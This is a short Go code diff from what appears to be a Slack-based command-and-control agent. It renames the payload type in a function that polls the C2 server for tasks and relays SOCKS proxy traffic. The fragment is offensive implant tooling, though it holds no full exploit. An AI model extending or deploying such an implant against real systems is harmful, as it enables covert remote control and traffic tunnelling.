@@ -65,7 +65,7 @@ func (s *SlackProfile) Checkin(agent *structs.Agent) error {
 }
 
 func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
-	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: s.getActiveUUID(agent), PayloadType: "fawkes", C2Profile: "slack"}
+	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: s.getActiveUUID(agent), PayloadType: "killa", C2Profile: "slack"}
 	resp, err := s.sendAndPoll(s.getActiveUUID(agent), msg, 10*time.Second)
 	if err != nil {
 		return []structs.Task{}, nil, nil
